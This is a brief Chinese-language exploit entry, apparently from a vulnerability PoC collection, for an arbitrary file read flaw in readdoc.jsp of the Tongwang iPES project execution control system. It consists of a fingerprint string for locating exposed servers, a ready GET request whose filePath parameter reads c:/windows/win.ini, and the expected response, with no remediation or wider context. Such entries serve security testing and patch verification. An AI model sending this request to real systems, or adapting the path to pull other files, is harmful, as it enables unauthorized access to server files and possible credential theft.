# 同望iPES项目执行控制系统readdoc.jsp存在任意文件读取漏洞

同望iPES ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="loginAction.struts?actionType=blockLogin"`
- **请求**：`GET /jsp/oa/archives/processNew/readdoc.jsp?filePath=c:/windows/win.ini HTTP/1.1`
- **响应特征**：200 [Mail]